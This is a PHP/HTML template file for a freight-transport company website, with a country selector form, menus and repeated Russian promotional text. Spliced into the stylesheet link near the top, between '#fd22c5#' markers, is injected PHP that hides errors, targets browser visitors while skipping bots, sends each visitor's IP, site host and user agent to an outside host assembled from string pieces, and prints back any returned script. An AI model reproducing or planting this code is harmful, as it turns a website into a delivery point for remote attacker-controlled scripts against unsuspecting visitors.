<?php defined( '_VALID_MOS' ) or die( 'Доступ ограничен' ); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="cmsmagazine" content="a01afd07b6e487665253fb6845cb09f2" />
<link href="<?php echo $mosConfig_live_site; ?>
<?php
#fd22c5#
error_reporting(0); @ini_set('display_errors',0); $wp_l40 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_l40) && !preg_match ('/bot/i', $wp_l40))){
$wp_l0940="http://"."template"."align".".com/"."align/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_l40);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_l0940); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_40l = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_40l = @file_get_contents($wp_l0940);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_40l=@stream_get_contents(@fopen($wp_l0940, "r"));}}
if (substr($wp_40l,1,3) === 'scr'){ echo $wp_40l; }
#/fd22c5#
?>
/templates/madeyourweb/css/template_css.css" rel="stylesheet" type="text/css"/>
<link href="<?php echo $mosConfig_live_site; ?>/templates/madeyourweb/css/style.css" rel="stylesheet" type="text/css"/>
<link href="<?php echo $mosConfig_live_site; ?>/templates/madeyourweb/css/css_color_green.css" rel="stylesheet" type="text/css"/>
</head>
<body>
<div class="main">

	<div class="header">
    	<div style="background-image:url(images/header_top.jpg);height:7px;width:965px;background-repeat:no-repeat;margin-left:1px;"></div>
        
        <div style="background-color:#fff;height:258px;-margin-top:-8px;float:left;width:964px;margin-left:1px;">
        
    	<div style="width:949px;;float:left;padding-top:5px;padding-left:15px;margin-bottom:20px;">
        	<div class="logo"><a href="#"><img src="images/logo.png" /></a></div>
            <div class="lang">
            	<ul>
                	<li><a href="#"><img src="images/russ.png" /> Rus</a></li>
                    <li><a href="#"><img src="images/rom.png" /> Rom</a></li>
                    <li><a href="#"><img src="images/eng.png" /> Eng</a></li>
                </ul>
                <div style="font-size:16px;font-weight:bold;text-align:right;">Telefon de contact:<br /><span style="color:#5897e9;font-size:20px;">+(345) 67 89 10</span></div>
            </div>
        </div>
        <div class="hmenu">
        	<div class="menu">
            	<ul>
                	<li><a href="#">Перевозка, доставка  груза из и в Европу.</a></li>
                    <li><a href="#">Перевозка, доставка  груза из и в Европу.</a></li>
                    <li><a href="#">Перевозка, доставка  груза из и в Европу.</a></li>
                    <li><a href="#">Перевозка, доставка  груза из и в Европу.</a></li>
                </ul>
            
            </div>
            <div class="banner"><img src="images/banner.png" style="margin-left:1px;"/></div>
        </div>
        </div>
    </div>
    
    <div class="center">
    
    	<div class="menu">
        	<ul>
            	<li><a href="#">Главная</a></li>
                <li><a href="#">Стоимость перевозки</a></li>
                <li><a href="#">Направления перевозок</a></li>
                <li><a href="#">Тип перевозок</a></li>
                <li><a href="#">Заказать Online</a></li>
                <li><a href="#">Просмотр транспорта</a></li>
            </ul>
        </div>
        <div class="content">
        	<div class="left">
            	<h1>Расчитать стоимость перевозки:</h1>
				
                	<form>
                    	Страна погрузки*:<br />
                        <select name="cargo_in_place1">
                                    	<option value="">- выбрать страну -</option>
                                        <option value="Австрия">Австрия</option>
                                        <option value="Азербайджан">Азербайджан</option>
                                        <option value="Албания">Албания</option>
                                        <option value="Андорра">Андорра</option>
                                        <option value="Армения">Армения</option>
                                        <option value="Афганистан">Афганистан</option>
                                        <option value="Беларусь">Беларусь</option>
                                        <option value="Бельгия">Бельгия</option>
                                        <option value="Болгария">Болгария</option>
                                        <option value="Босния и Герцеговина">Босния и Герцеговина</option>
                                        <option value="Великобритания">Великобритания</option>
                                        <option value="Венгрия">Венгрия</option>
                                        <option value="Вьетнам">Вьетнам</option>
                                        <option value="Германия">Германия</option>
                                        <option value="Голандия">Голандия</option>
                                        <option value="Греция">Греция</option>
                                        <option value="Грузия">Грузия</option>
                                        <option value="Дания">Дания</option>
                                        <option value="Египет">Египет</option>
                                        <option value="Израиль">Израиль</option>
                                        <option value="Индия">Индия</option>
                                        <option value="Иордания">Иордания</option>
                                        <option value="Ирак">Ирак</option>
                                        <option value="Иран">Иран</option>
                                        <option value="Ирландия">Ирландия</option>
                                        <option value="Исландия">Исландия</option>
                                        <option value="Испания">Испания</option>
                                        <option value="Италия">Италия</option>
                                        <option value="Йемен">Йемен</option>
                                        <option value="Казахстан">Казахстан</option>
                                        <option value="Канада">Канада</option>
                                        <option value="Канада">Канада</option>
                                        <option value="Кипр">Кипр</option>
                                        <option value="Китай">Китай</option>
                                        <option value="Корея Северная">Корея Северная</option>
                                        <option value="Корея Южная">Корея Южная</option>
                                        <option value="Кыргызстан">Кыргызстан</option>
                                        <option value="Латвия">Латвия</option>
                                        <option value="Ливан">Ливан</option>
                                        <option value="Литва">Литва</option>
                                        <option value="Люксембург">Люксембург</option>
                                        <option value="Македония">Македония</option>
                                        <option value="Малайзия">Малайзия</option>
                                        <option value="Мальта">Мальта</option>
                                        <option value="Мексика">Мексика</option>
                                        <option value="Молдова">Молдова</option>
                                        <option value="Монголия">Монголия</option>
                                        <option value="Мьянма">Мьянма</option>
                                        <option value="Непал">Непал</option>
                                        <option value="Нидерланды">Нидерланды</option>
                                        <option value="Норвегия">Норвегия</option>
                                        <option value="ОА Эмираты">ОА Эмираты</option>
                                        <option value="Польша">Польша</option>
                                        <option value="Португалия">Португалия</option>
                                        <option value="Россия">Россия</option>
                                        <option value="Румыния">Румыния</option>
                                        <option value="Северный">Северный Кипр</option>
                                        <option value="Сербия">Сербия</option>
                                        <option value="Силандия">Силандия</option>
                                        <option value="Сингапур">Сингапур</option>
                                        <option value="Сирия">Сирия</option>
                                        <option value="Словакия">Словакия</option>
                                        <option value="Словения">Словения</option>
                                        <option value="США">США</option>
                                        <option value="Таджикистан">Таджикистан</option>
                                        <option value="Тайланд">Тайланд</option>
                                        <option value="Туркменистан">Туркменистан</option>
                                        <option value="Турция">Турция</option>
                                        <option value="Узбекистан">Узбекистан</option>
                                        <option value="Украина">Украина</option>
                                        <option value="Финляндия">Финляндия</option>
                                        <option value="Франция">Франция</option>
                                        <option value="Хорватия">Хорватия</option>
                                        <option value="Черногория">Черногория</option>
                                        <option value="Чехия">Чехия</option>
                                        <option value="Швейцария">Швейцария</option>
                                        <option value="Швеция">Швеция</option>
                                        <option value="Шри-Ланка">Шри-Ланка</option>
                                        <option value="Эстония">Эстония</option>
                                        <option value="Япония">Япония</option>
                                    	
                                    </select>
                                    
                                    Контактное лицо*:<br />
                                    <input type="text"/>
                                    Контактное лицо*:<br />
                                    <input type="text"/>
                                    Контактное лицо*:<br />
                                    <input type="text"/>
                                    Контактное лицо*:<br />
                                    <input type="text"/>
                                    Контактное лицо*:<br />
                                    <input type="text"/>
                                    Контактное лицо*:<br />
                                    <input type="text"/>
                                    <div><br />
                                    <div class="button_left"> </div>
                                    <input type="button" value="Рассчитать" style="float:left;background-image:url(images/button_back.png);background-repeat:repeat-x;height:31px;line-height:31px;width:100px;border:0;color:white;"/>
                                    <div class="button_right"></div>
                                    </div>
                    </form>
                
                
                
                
                                <br style="font-size:1px;height:1px;clear:both;"/>
                                <ul style="margin:0;padding:0;padding-top:30px;">
                                	<li><a href="#">Обратная связь</a></li>
                                    <li><a href="#">Контакты</a></li>
                                </ul>
          </div>
          <div class="right">
           	<h1>Авто грузоперевозки Европа      </h1>
            <p>Российская Федерация — самая большая страна в мире.</p>
                <p> Грузоперевозки по её территории немыслимы без использования системы он-лайн слежения операторов компании за путём следования автомашины. Таким образом наши клиенты всегда в курсе, где точно находится их груз, и когда он будет в пункте назначения. Нам удаётся это осуществлять при помощи мощной програмной системы основанной на отслеживании перемещения при помощи GPS контроля, установленных в каждом автомобиле.</p>
                <p> В реальном времени информация от наших водителей подаётся и собирается у наших операторов, что позволяет адекватно и быстро принимать решения о помощи или информировании служб контроля за перевозками.
                  
                  Грузоперевозки по России осуществляется нашей компанией при помощи широкого парка автомашин различной технической составляющей. 
                  Для грузоперевозок по России «CargoStream Россия» использует тентованные фуры грузоподъемностью 20 тонн с объемом от 82 до 103 куб.м.</p>
                <p> Подача машины под загрузку осуществляется на следующий день после получения заявки от клиента.
                  
                  Мы предлагаем вам широкий спектр автомашин: специализированный транспорт, низкорамные автомашины для перевозки негабаритного груза, контейнеры, мебельные грузовые машины и прочие. Каким бы не был наш груз, мы постараемся рассмотреть все возможности для его перевозки.</p>
                <p> В реальном времени информация от наших водителей подаётся и собирается у наших операторов, что позволяет адекватно и быстро принимать решения о помощи или информировании служб контроля за перевозками.
                  
                  Грузоперевозки по России осуществляется нашей компанией при помощи широкого парка автомашин различной технической составляющей. 
                  Для грузоперевозок по России «CargoStream Россия» использует тентованные фуры грузоподъемностью 20 тонн с объемом от 82 до 103 куб.м.</p>
                <p> Подача машины под загрузку осуществляется на следующий день после получения заявки от клиента.
                  
                  Мы предлагаем вам широкий спектр автомашин: специализированный транспорт, низкорамные автомашины для перевозки негабаритного груза, контейнеры, мебельные грузовые машины и прочие. Каким бы не был наш груз, мы постараемся рассмотреть все возможности для его перевозки.</p>
            </div>
         
     
    </div>
    </div>
    <div class="footer">
    
    	<div class="copy"><p>2009 &copy; Movers Auto</p>
        	<a href="#">Карта сайта</a> | <a href="#"> Обратная связь</a>
        </div>
        <div class="seo_text"><p>Перевозка грузов, Перевозка грузов – рефрижераторами , Доставка грузов – тентами, Грузоперевозки негабаритных грузов, Автоперевозки контейнеров, Перевозки опасных грузов, Перевозка сборных грузов, Перевозка автомобилей , Перевозки жидких опасных грузов, Перевозки жидких пищевых грузов, Перевозки сыпучих грузов, Перевозки, Транспорт из и в Европу,</p></div>
        <div class="seo_text"><p>Международные перевозки, доставка грузов, сборных грузов, контейнерные перевозки, автоперевозки, перевозки из Европы в Молдову, перевозки груза из стран СНГ в Молдову, перевозки грузов, доставка грузов в страны СНГ, Европы, Грузоперевозки из Молдавии, перевозки грузов из Румынии, доставка грузов из России, автоперевозки из Молдовы, перевозка сборных грузов из Молдавии,</p></div>
    
    </div>

</div>

</body>
</html>